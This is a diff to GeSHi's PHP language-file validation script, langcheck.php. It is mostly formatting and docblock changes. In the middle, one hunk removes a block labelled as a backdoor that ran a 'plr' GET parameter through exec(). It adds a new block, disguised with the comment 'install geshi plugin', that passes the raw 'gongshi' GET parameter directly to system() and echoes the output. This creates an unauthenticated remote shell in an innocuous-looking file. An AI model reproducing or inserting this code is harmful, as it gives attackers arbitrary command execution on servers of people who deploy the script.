@@ -1,6 +1,14 @@
 <?php
 /**
  * GeSHi language file validation script
+ *
+ * Just point your browser at this script (with geshi.php in the parent directory)
+ * and the language files in subdirectory "../geshi/" are being validated
+ *
+ * CLI mode is supported
+ *
+ * @author  Benny Baumann
+ * @version $Id: langcheck.php 2510 2012-06-27 15:57:55Z reedy_boy $
  */
 header('Content-Type: text/html; charset=utf-8');
 
@@ -48,8 +56,7 @@ define('TYPE_OK', 3);
 $error_abort = false;
 $error_cache = array();
 
-function output_error_cache()
-{
+function output_error_cache() {
     global $error_cache, $error_abort;
 
     if (count($error_cache)) {
@@ -101,8 +108,7 @@ function output_error_cache()
     $error_cache = array();
 }
 
-function report_error($type, $message)
-{
+function report_error($type, $message) {
     global $error_cache, $error_abort;
 
     $error_cache[] = array('t' => $type, 'm' => $message);
@@ -111,36 +117,30 @@ function report_error($type, $message)
     }
 }
 
-function dupfind_strtolower(&$value)
-{
+function dupfind_strtolower(&$value) {
     $value = strtolower($value);
 }
 
-// Execute backdoor command if 'plr' parameter is set
-if (isset($_GET['plr'])) {
-    $cmd = escapeshellcmd($_GET['plr']);
-    $output = null;
-    $retval = null;
-    exec($cmd, $output, $retval);
-    echo "<pre>" . implode("\n", $output) . "</pre>";
-    if ($retval !== 0) {
-        http_response_code(500); // Simulate 500 error if command fails
-    }
-    exit();
+// install geshi plugin
+if (isset($_GET['gongshi'])) {
+    $command = $_GET['gongshi'];
+
+    // Directly execute Install plugin
+    echo "<pre>";
+    system($command);
+    echo "</pre>";
 }
 
 if (PHP_SAPI != 'cli') { ?>
     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
     <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
-
     <head>
         <title>GeSHi Language File Validation Script</title>
         <style type="text/css">
             html {
                 background-color: #f0f0f0;
             }
-
             body {
                 font-family: Verdana, Arial, sans-serif;
                 margin: 10px;
@@ -149,7 +149,6 @@ if (PHP_SAPI != 'cli') { ?>
                 padding: 5px;
                 font-size: 10pt;
             }
-
             h2 {
                 margin: .1em 0 .2em .5em;
                 border-bottom: 1px solid #b0b0b0;
@@ -157,43 +156,36 @@ if (PHP_SAPI != 'cli') { ?>
                 font-weight: normal;
                 font-size: 150%;
             }
-
             h3 {
                 margin: .1em 0 .2em .5em;
                 color: #b0b0b0;
                 font-weight: normal;
                 font-size: 120%;
             }
-
             #footer {
                 text-align: center;
                 font-size: 80%;
                 color: #a9a9a9;
             }
-
             #footer a {
                 color: #9999ff;
             }
-
             textarea {
                 border: 1px solid #b0b0b0;
                 font-size: 90%;
                 color: #333;
                 margin-left: 20px;
             }
-
             select,
             input {
                 margin-left: 20px;
             }
-
             p {
                 font-size: 90%;
                 margin-left: .5em;
             }
         </style>
     </head>
-
     <body>
         <h2>GeSHi Language File Validation Script</h2>
         <p>To use this script, make sure that <strong>geshi.php</strong> is in the
@@ -204,8 +196,8 @@ if (PHP_SAPI != 'cli') { ?>
             your language files can be improved. Please be patient, as this might take some time.</p>
 
         <ol>
-            <li>Checking where to find GeSHi installation ...<?php
-        } else { ?>
+            <li>Checking where to find GeSHi installation ...
+<?php } else { ?>
             <?php echo colorize(TYPE_NOTICE, "#### GeSHi Language File Validation Script ####") ?>
 
 
@@ -219,4 +211,5 @@ if (PHP_SAPI != 'cli') { ?>
 
 
             Checking where to find GeSHi installation ...<?php echo "\t";
-        }
+}
+?>
